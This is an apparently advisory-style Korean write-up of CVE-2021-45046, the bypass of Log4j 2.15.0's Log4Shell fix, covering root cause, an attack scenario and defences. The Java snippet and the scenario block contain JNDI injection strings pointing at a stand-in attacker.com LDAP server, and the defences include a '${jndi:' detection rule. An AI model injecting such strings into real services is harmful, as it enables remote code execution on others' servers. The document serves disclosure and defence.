# CVE-2021-45046 - Log4j 2 추가 RCE (Log4Shell 패치 우회)

## 개요

| 항목 | 내용 |
|------|------|
| CVE ID | CVE-2021-45046 |
| CVSS | 9.0 (Critical) |
| 영향 소프트웨어 | Apache Log4j 2 |
| 영향 버전 | 2.0-beta9 ~ 2.15.0 (2.12.2 제외) |
| 수정 버전 | 2.16.0 (Java 8+), 2.12.2 (Java 7) |
| 공격 유형 | RCE (Remote Code Execution) |
| 발견일 | 2021-12-14 |

## 영향 범위 & 심각성

CVE-2021-44228(Log4Shell)의 초기 수정 버전인 2.15.0이 불완전하여 발생한 추가 취약점이다.

- **비기본 설정**(Thread Context Map 패턴 사용 시)에서 JNDI Lookup을 통한 원격 코드 실행이 여전히 가능
- 초기 패치 적용 후 안심했던 모든 조직이 재패치 대상
- 전 세계 수만 개 서비스가 2.15.0으로 업데이트 후에도 여전히 취약한 상태
- 금융, 정부, 클라우드 인프라 등 Log4j를 사용하는 모든 Java 기반 백엔드에 영향
- AWS, Azure, GCP의 관리형 서비스들도 긴급 재패치 수행

## 취약점 기술 분석

### 근본 원인

Log4j 2.15.0은 JNDI Lookup을 기본적으로 비활성화했지만, `PatternLayout`에서 **Thread Context Map**(MDC) 패턴을 사용하는 경우 입력값이 여전히 Lookup으로 평가되었다.

```java
// log4j2.xml 설정 예시 (취약한 패턴)
<PatternLayout pattern="%X{user}"/>

// 공격자가 MDC에 악성 JNDI 문자열 삽입 가능
ThreadContext.put("user", "${jndi:ldap://attacker.com/exploit}");
```

### 우회 메커니즘

- 2.15.0에서 `allowedLdapHosts`와 `allowedLdapClasses` 검증을 추가했으나 우회 가능
- `localhost`로의 JNDI 요청이 허용되어 DoS 공격 가능
- 특정 설정 조합에서 allowlist를 완전히 우회하여 RCE 달성

## 공격 시나리오

```
1단계: 대상 서비스가 Log4j 2.15.0을 사용하고 MDC 패턴을 활용하는지 확인
2단계: HTTP 헤더나 입력 필드를 통해 Thread Context에 값 삽입
       X-Forwarded-For: ${jndi:ldap://attacker.com:1389/Exploit}
3단계: MDC 패턴이 로그에 기록될 때 JNDI Lookup 실행
4단계: 공격자의 LDAP 서버가 악성 Java 클래스 반환
5단계: 대상 서버에서 원격 코드 실행
```

## 방어 방법

1. **즉시 업데이트**: Log4j 2.16.0 이상으로 업그레이드 (Message Lookup 기능 완전 제거)
2. **JVM 옵션**: `-Dlog4j2.formatMsgNoLookups=true` (2.15.0에서는 불완전)
3. **JNDI 완전 비활성화**: `log4j2.enableJndi=false` 시스템 프로퍼티 설정
4. **네트워크 제한**: 서버의 아웃바운드 LDAP/RMI 트래픽 차단
5. **WAF 규칙**: `${jndi:` 패턴 탐지 규칙 적용 (인코딩 우회 주의)
6. **JndiLookup 클래스 제거**: `zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`

## 교훈

- **첫 번째 패치를 맹신하지 말 것**: 긴급 패치는 종종 불완전하다. 후속 패치를 지속 모니터링
- **심층 방어(Defense in Depth)**: 패치 한 겹에만 의존하지 말고, 네트워크 격리 + WAF + 런타임 보호 병행
- **비기본 설정도 테스트 범위에 포함**: 보안 패치는 모든 설정 조합에서 검증 필수
- **SBOM 관리**: 어떤 버전의 Log4j가 어디에 사용되는지 즉시 파악 가능해야 함
- **아웃바운드 트래픽 제한은 기본**: 서버가 외부로 임의 연결을 맺을 수 없도록 기본 차단 적용

## 참고 자료

- [Apache Log4j Security - CVE-2021-45046](https://logging.apache.org/log4j/2.x/security.html)
- [NVD - CVE-2021-45046](https://nvd.nist.gov/vuln/detail/CVE-2021-45046)
- [LunaSec - Log4Shell Update](https://www.lunasec.io/docs/blog/log4j-zero-day-update-on-cve-2021-45046/)
- [AWS Security Bulletin](https://aws.amazon.com/security/security-bulletins/)
- [CISA Alert](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)
